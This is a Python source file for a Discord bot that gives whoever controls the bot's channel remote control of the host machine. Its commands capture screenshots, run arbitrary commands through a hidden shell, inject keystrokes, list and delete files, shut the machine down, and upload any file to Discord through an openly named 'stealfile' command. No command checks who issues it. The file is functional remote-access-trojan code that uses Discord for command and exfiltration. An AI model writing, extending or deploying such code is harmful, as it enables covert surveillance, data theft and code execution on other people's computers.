import discord
from discord.ext import commands
import platform
import psutil
import pyautogui
import os
import subprocess
import webbrowser
import sys
import json

# Load bot token from config.json
with open('config.json', 'r') as config_file:
    config = json.load(config_file)

bot_token = config['token']

# Initialize the bot
intents = discord.Intents.all()
intents.typing = False
intents.presences = False
bot = commands.Bot(command_prefix='!', intents=intents)

bot.remove_command("help")

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user.name}')

@bot.command()
async def viewscreen(ctx):
    # Specify the path to the "media" folder in the root directory
    media_folder = "media"
    
    # Check if the "media" folder exists, and create it if not
    if not os.path.exists(media_folder):
        os.mkdir(media_folder)

    # Take a screenshot
    screenshot = pyautogui.screenshot()
    screenshot_path = os.path.join(media_folder, "screenshot.png")  # Set the screenshot path within the "media" folder
    screenshot.save(screenshot_path)

    # Send the screenshot as a Discord message attachment
    await ctx.send(file=discord.File(screenshot_path))

    # Delete the local screenshot file
    os.remove(screenshot_path)

@bot.command()
async def setvolume(ctx, volume: str):
    # Remove the '%' sign if it's included in the input
    volume = volume.rstrip('%')

    try:
        # Convert the volume to an integer (assuming it's a valid percentage)
        volume_int = int(volume)
        
        # Check if the volume is within a valid range (0-100)
        if 0 <= volume_int <= 100:
            # Calculate the equivalent volume for nircmd (0-65535)
            nircmd_volume = int(65535 * (volume_int / 100))
            
            # Specify the path to the folder containing nircmd.exe
            nircmd_folder = "bin"
            
            # Set the system volume using subprocess
            subprocess.Popen([os.path.join(nircmd_folder, 'nircmd.exe'), 'setsysvolume', str(nircmd_volume)])
            await ctx.send(f"Volume set to {volume_int}%")
        else:
            await ctx.send("Volume must be between 0% and 100%.")
    except ValueError:
        await ctx.send("Invalid volume value. Please provide a valid percentage (e.g., 50%).")
    except Exception as e:
        await ctx.send(f"An error occurred: {str(e)}")

@bot.command()
async def openlink(ctx, link: str):
    # Open a website link in the default web browser
    try:
        webbrowser.open(link)
        await ctx.send(f"Opening {link} in the default web browser.")
    except Exception as e:
        await ctx.send(f"An error occurred: {str(e)}")

@bot.command()
async def start(ctx, filepath: str):
    # Start a file without UAC elevation
    try:
        subprocess.Popen(filepath, shell=True)
        await ctx.send(f"Starting {filepath}.")
    except Exception as e:
        await ctx.send(f"An error occurred: {str(e)}")

@bot.command()
async def startprocess(ctx, process_name: str):
    # Start a process by name without showing the console window
    try:
        subprocess.Popen(process_name, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
        await ctx.send(f"Starting the process {process_name}.")
    except Exception as e:
        await ctx.send(f"An error occurred: {str(e)}")

@bot.command()
async def viewprocesses(ctx):
    try:
        # Run the 'tasklist' command and save the output to a text file
        process_list = subprocess.check_output('tasklist', shell=True, text=True)
        with open("process_list.txt", "w") as file:
            file.write(process_list)

        # Send the text file as a Discord message attachment
        await ctx.send(file=discord.File("process_list.txt"))

        # Delete the local text file
        os.remove("process_list.txt")
    except Exception as e:
        await ctx.send(f"An error occurred: {str(e)}")

@bot.command()
async def sysinfo(ctx):
    # Retrieve and send system information, including disk, CPU, and memory info
    try:
        uname = platform.uname()
        cpu_percent = psutil.cpu_percent(interval=1)
        memory = psutil.virtual_memory()
        disk_usage = psutil.disk_usage('/')

        system_info = f"**System Information:**\n" \
                      f"Operating System: {uname.system} {uname.release}\n" \
                      f"Machine: {uname.machine}\n" \
                      f"Processor: {uname.processor}\n" \
                      f"Python Version: {platform.python_version()}\n" \
                      f"\n" \
                      f"**Disk Information:**\n" \
                      f"Total Disk Space: {disk_usage.total / (1024 ** 3):.2f} GB\n" \
                      f"Used Disk Space: {disk_usage.used / (1024 ** 3):.2f} GB\n" \
                      f"Free Disk Space: {disk_usage.free / (1024 ** 3):.2f} GB\n" \
                      f"\n" \
                      f"**CPU Usage:**\n" \
                      f"CPU Usage: {cpu_percent}%\n" \
                      f"\n" \
                      f"**Memory Usage:**\n" \
                      f"Total Memory: {memory.total / (1024 ** 3):.2f} GB\n" \
                      f"Available Memory: {memory.available / (1024 ** 3):.2f} GB\n" \
                      f"Used Memory: {memory.used / (1024 ** 3):.2f} GB\n"

        await ctx.send(system_info)
    except Exception as e:
        await ctx.send(f"An error occurred: {str(e)}")

@bot.command()
async def killprocess(ctx, process_name: str):
    # Kill a process by name
    try:
        subprocess.Popen(['taskkill', '/F', '/IM', process_name])
        await ctx.send(f"Terminating the process {process_name}.")
    except Exception as e:
        await ctx.send(f"An error occurred: {str(e)}")

# ...

# Create a custom help command
@bot.command()
async def help(ctx):
    # Define the help message with descriptions for each command
    help_message = "**Available commands:**\n\n" \
                   "`!viewscreen` - Capture and send a screenshot.\n" \
                   "`!setvolume [volume]` - Set the system volume (0-100).\n" \
                   "`!openlink [link]` - Open a link in the default web browser.\n" \
                   "`!start [filepath]` - Start a file or program.\n" \
                   "`!startprocess [process_name]` - Start a process by name.\n" \
                   "`!viewprocesses` - View a list of running processes as a text file.\n" \
                   "`!sysinfo` - View system information including CPU, memory, and disk usage.\n" \
                   "`!killprocess [process_name]` - Terminate a process by name.\n" \
                   "`!shutdown` - Shut down the computer (admin only).\n" \
                   "`!exit` - Gracefully exit the bot.\n" \
                   "`!listfiles [directory]` - List all files in the chosen directory.\n" \
                   "`!reconnect` - Reconnects the PC to Discord.\n" \
                   "`!restart` - Restarts the computer.\n" \
                   "`!deletefile [filepath]` - Deletes the file.\n" \
                   "`!stealfile [filepath]` - Steals the file.\n" \
                   "`!type string goes here` - Types on the computer.\n" \

    # Send the help message
    await ctx.send(help_message)
@bot.command()
async def shutdown(ctx):
        # Check the operating system and execute the appropriate shutdown command
        if platform.system() == "Windows":
            os.system("shutdown /s /t 1")  # Windows shutdown command
            await ctx.send("Shutting down the PC...")
        elif platform.system() == "Linux":
            os.system("shutdown -h now")  # Linux shutdown command
            await ctx.send("Shutting down the PC...")
        elif platform.system() == "Darwin":
            os.system("sudo shutdown -h now")  # macOS shutdown command
            await ctx.send("Shutting down the PC...")
        else:
            await ctx.send("Unsupported operating system.")
@bot.command()
async def restart(ctx):
    try:
        # Check the operating system and execute the appropriate restart command
        if platform.system() == "Windows":
            os.system("shutdown /r /t 1")  # Windows restart command
            await ctx.send("Restarting the PC...")
        elif platform.system() == "Linux":
            os.system("reboot")  # Linux reboot command
            await ctx.send("Restarting the PC...")
        elif platform.system() == "Darwin":
            os.system("sudo reboot")  # macOS reboot command
            await ctx.send("Restarting the PC...")
        else:
            await ctx.send("Unsupported operating system.")
    except Exception as e:
        await ctx.send(f"An error occurred: {str(e)}")

# Create a custom exit command (Admin Only)
@bot.command()
async def exit(ctx):
        await ctx.send("Exiting...")
        await bot.close()

@bot.command()
async def listfiles(ctx, directory: str):
    try:
        # Print the directory path for debugging
        print(f"Listing files in directory: {directory}")

        # Check if the directory exists
        if os.path.exists(directory):
            # List all files in the directory
            files = os.listdir(directory)
            # Create a formatted list with each file on a separate line
            file_list = "\n".join(files)
            # Send the formatted list as a Discord message
            await ctx.send(f"Files in {directory}:\n```{file_list}```")
        else:
            await ctx.send(f"The directory {directory} does not exist.")
    except Exception as e:
        # Print any exceptions for debugging
        print(f"An error occurred: {str(e)}")
        await ctx.send(f"An error occurred: {str(e)}")

@bot.command()
async def reconnect(ctx):
    try:
        # Get the command that started the bot
        command = [sys.executable, "main.pyw"]
        subprocess.Popen(command)
        await ctx.send("Reconnecting...")
        await bot.close()
    except Exception as e:
        await ctx.send(f"An error occurred: {str(e)}")

@bot.command()
async def stealfile(ctx, *, filepath: str):
    try:
        filepath = filepath.strip('"')

        # Check if the file exists
        if os.path.isfile(filepath):
            # Send the file as a Discord message attachment
            await ctx.send(file=discord.File(filepath))
        else:
            await ctx.send(f"The file {filepath} does not exist.")
    except Exception as e:
        await ctx.send(f"An error occurred: {str(e)}")

@bot.command()
async def deletefile(ctx, *, filename: str):
    try:
        # Remove quotes if they exist
        filename = filename.strip('"')

        # Check if the file exists
        if os.path.isfile(filename):
            # Delete the file
            os.remove(filename)
            await ctx.send(f"Deleted the file `{filename}`.")
        else:
            await ctx.send(f"The file `{filename}` does not exist.")
    except Exception as e:
        await ctx.send(f"An error occurred: {str(e)}")

@bot.command()
async def type(ctx, *, text: str):
    try:
        # Type the specified text on the computer
        pyautogui.typewrite(text)
        await ctx.send(f"Typed: {text}")
    except Exception as e:
        await ctx.send(f"An error occurred: {str(e)}")

@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound):
        await ctx.send("Invalid command. Type `!help` to see the list of available commands.")
    else:
        await ctx.send(f"An error occurred: {str(error)}")


# Replace 'YOUR_BOT_TOKEN_HERE' with your actual bot token
bot.run(bot_token)
